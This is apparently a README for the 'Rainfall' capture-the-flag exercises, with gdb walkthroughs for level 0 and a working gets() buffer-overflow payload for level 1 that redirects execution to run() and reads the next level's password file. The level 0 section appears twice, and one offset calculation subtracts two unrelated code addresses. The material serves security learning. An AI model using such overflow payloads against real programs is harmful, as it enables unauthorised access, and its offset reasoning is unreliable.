# Rainfall

---

## Introduction

 This is the continuation of snow-crash...
 Each level presents a unique puzzle or exploit that you must solve to find a hidden flag and move on to the next challenge
 Whether you are a beginner or an experienced hacker, these exercises will test your problem-solving abilities and expand your knowledge in various aspects of cyber security.

|<h1>Cyber Security</h1>|
|-|
| <img width=500px src=https://www.asylas.com/asylas/security-memes-our-year-end-humor-break/> |

---

## ![Disassemble the memory](https://img.shields.io/badge/Level-0-blue) Disassemble the memory

![Disassemble the memory](https://img.shields.io/badge/Disassemble%20the%20memory-ASM-blue?style=for-the-badge&logo=lock)

**Description:** In this level you have to dissasamble the memory where you will find that there is an execution which will allow you to see the password for the next level if the `cmp` is meet.

**Steps:**
1. **Execute the debugger**
   `gdb level0`
   `disas main`
   `0x08048ed4 <+20>:   call   0x8049710 <atoi>`
   `>0x08048ed9 <+25>:  cmp    $0x1a7,%eax`
2. **Convert the number to see what you need to compare == true**
   `echo $((16#1a7)) // 423`
3. Execute with the answer
   `./level0 423`
4. Show the password
   `whoami // level1`
   `cat /home/user/level1/.pass`


You will realize the last step (4.) it's repeated a lot throughout the whole project...

---

## ![Disassemble the memory](https://img.shields.io/badge/Level-0-blue) Disassemble the memory

![Disassemble the memory](https://img.shields.io/badge/Disassemble%20the%20memory-ASM-blue?style=for-the-badge&logo=lock)

**Description:** In this level you have to dissasamble the memory where you will find that there is an execution which will allow you to see the password for the next level if the `cmp` is meet.

**Steps:**
1. **Execute the debugger**
   `gdb level0`
   `disas main`
   `0x08048ed4 <+20>:   call   0x8049710 <atoi>`
   `>0x08048ed9 <+25>:  cmp    $0x1a7,%eax`
2. **Convert the number to see what you need to compare == true**
   `echo $((16#1a7)) // 423`
3. Execute with the answer
   `./level0 423`
4. Show the password
   `whoami // level1`
   `cat /home/user/level1/.pass`
   `exit`


You will realize the last step (4.) it's repeated a lot throughout the whole project...

---

## ![Buffer Overflow `gets()`](https://img.shields.io/badge/Level-1-green) Buffer Overflow `gets()`

![Buffer Overflow `gets()`](https://img.shields.io/badge/Buffer%20Overflow%20gets()-clib-blue?style=for-the-badge&logo=lock)

**Description:** After looking at the assembler code we can identify a buffer overflow vulnerability on the unsafe use of the `gets()` function which can allow us to call the function `run()` by overflowing the address of the get's destiny and thus affecting the stack frame call (putting the address of the function run to be executed after the `gets()` call)

**Steps:**
1. **Execute the debugger**
   `i func // see the run function [0x08048444]`
   `disas main`
   `0x08048490 <+16>:   call   0x8048340 <gets@plt> // see the address of target 0x8048340`
2. **Calculate how many bytes between the address of target and run function**
   `echo $((0x08048490 - 0x08048444)) // 76 bytes`
3. **Test the hypotesis**
   `(python -c 'print("A" * 75)' | ./level1 // Nothing but input is not waiting, EOI received, must use the trick with cat -`
   `(python -c 'print("A" * 75)'; cat -) | ./level1 // Nothing`
   `(python -c 'print("A" * 76)'; cat -) | ./level1 // Illegal instruction (core dumped)`
   `(python -c 'print("A" * 77)'; cat -) | ./level1 // Illegal instruction (core dumped)`
   `(python -c 'print("A" * 78)'; cat -) | ./level1 // Segmentation fault (core dumped)`
4. Get address of run
   `objdump -d ./level1 | grep run // 08048444 <run>:`
5. Setup the exploit
   `(python -c 'print("A" * 76 + "\x44\x84\x04\x08")'; cat -) | ./level1`
6. Show the password
   `whoami // level1`
   `cat /home/user/level2/.pass`
   `exit`

---

<!--
## ![Name](https://img.shields.io/badge/Level-2-yellow) Name

---

## ![Name](https://img.shields.io/badge/Level-3-orange) Name

---

## ![Name](https://img.shields.io/badge/Level-4-red) Name

---

## ![Name](https://img.shields.io/badge/Level-5-purple) Name

---

## ![Name](https://img.shields.io/badge/Level-6-pink) Name

---

## ![Name](https://img.shields.io/badge/Level-7-lightblue) Name

---

## ![Name](https://img.shields.io/badge/Level-8-teal) Name

---

## ![Name](https://img.shields.io/badge/Level-9-cyan) Name
-->

## Conclusion

Each level provided a unique opportunity to apply and expand our skills in cyber security.


---
